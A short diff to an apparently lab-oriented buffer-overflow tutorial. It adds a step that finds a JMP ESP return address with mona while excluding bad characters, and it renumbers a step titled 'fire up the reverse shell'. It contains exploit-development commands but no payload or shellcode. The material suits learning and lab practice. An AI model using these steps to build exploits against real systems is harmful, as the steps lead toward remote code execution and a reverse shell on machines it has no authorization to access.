@@ -58,7 +58,16 @@ find the badchars using the following command
 !mona compare -f c:\mona\bytearray.bin -a 005FF910(ESP ADDRESS)
 ```
 
-## 5th step : fire up the reverse shell
+## 5th step : find the return address 
+
+send buffer after editing python3 findingBadchars.py
+```
+!mona jmp -r esp -cpb (mybadchars) "\x00\x23 etc..."
+```
+
+Take one of the adresses
+
+## 6th step : fire up the reverse shell
 
 We can also create encoded payloads if some sort of protections are presents
 ```
